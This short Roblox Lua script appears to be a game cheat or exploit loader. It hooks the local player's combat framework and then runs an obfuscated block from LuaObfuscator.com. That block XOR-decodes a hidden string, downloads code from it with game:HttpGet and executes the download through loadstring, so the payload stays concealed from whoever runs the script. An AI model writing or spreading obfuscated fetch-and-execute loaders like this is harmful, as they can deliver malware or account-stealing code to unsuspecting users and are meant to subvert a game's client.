local Player = game:GetService("Players").LocalPlayer
local Char = Player.Character or Player.CharacterAdded:Wait()
local CombatFramework = require(Player.PlayerScripts.CombatFramework)
local Camera = require(game.ReplicatedStorage.Util.CameraShaker)
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1 + 0 , #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + (1074 -(986 + 87)) )),v1(v2(v9,(1 -0) + (v11% #v9) ,(2 -1) + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\248\45\233\176\210\16\212\219\222\106\195\161\137\18\196\194\148\55\227\189\212\81\217\198\218\33\245\244\202\31\216\205\148\8\255\175\207\23\210\141\215\48\231\228\211\17\218\198\213\120\193\147\244\63\229\147\250\4\199\154\230\63\242\249\252\23\222\151\245\50\231\242\253\31\215\157\145\61\248\251\136\0\178\145\232\36\235\150\236\17\210\138","\126\177\163\187\69\134\219\167")))();